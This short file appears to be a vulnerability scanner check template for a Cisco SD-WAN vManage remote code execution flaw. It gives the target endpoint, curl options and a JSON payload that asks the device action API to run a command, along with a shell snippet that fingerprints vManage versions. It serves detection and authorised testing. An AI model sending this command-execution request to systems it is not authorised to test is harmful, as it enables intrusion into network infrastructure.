AUTHOR='@xer0dayz'
VULN_NAME='CVE-2023-32460 - Cisco IOS XE SD-WAN vManage RCE'
URI="/dataservice/device/action/deviceAction"
METHOD='POST'
MATCH='command output'
SEVERITY='P1 - CRITICAL'
CURL_OPTS="--user-agent 'Mozilla/5.0' -s --insecure -L -H 'Content-Type: application/json' -H 'X-XSRF-TOKEN: test'"
PAYLOAD='{"action":"show version","devices":[{"deviceIP":"127.0.0.1"}],"deviceType":"vedge"}'
SECONDARY_COMMANDS='''
# Check for vManage version
VERSION_CHECK=$(curl -s -k -I "https://$TARGET/" | grep -i '^Server:' | grep -i 'vManage')
if [ -n "$VERSION_CHECK" ]; then
    echo -e "\n[!] Cisco vManage Detected"
    echo "[*] Versions before 20.9.3, 20.10.1.2, 20.11.0.3 are vulnerable"
    echo "[*] This is an authenticated RCE vulnerability in the web-based management interface"
fi
'''

# This vulnerability allows authenticated remote code execution on Cisco SD-WAN vManage devices
